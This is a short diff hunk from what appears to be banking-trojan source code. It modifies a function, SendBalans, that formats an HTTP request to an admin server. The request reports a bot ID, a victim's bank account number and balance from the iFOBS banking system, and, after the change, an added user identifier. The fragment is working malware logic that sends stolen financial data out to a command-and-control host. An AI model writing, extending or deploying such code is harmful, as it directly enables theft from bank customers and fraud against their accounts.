@@ -127,7 +127,8 @@ static DWORD WINAPI SendBalans( LPVOID p )
 		AccBalans* ab = (AccBalans*)p;
 		fwsprintfA pwsprintfA = Get_wsprintfA();
 		TMemory request(512);
-		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&mode=balance&sum=%s&acc=%s", urlAdmin, BOT_UID, ab->balans, ab->acc );
+		string azUser = GetAzUser();
+		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=balance&sum=%s&acc=%s", urlAdmin, BOT_UID, azUser.t_str(), ab->balans, ab->acc );
 //		THTTP H;
 //		H.Get(request.AsStr());
 		THTTPResponseRec Response;
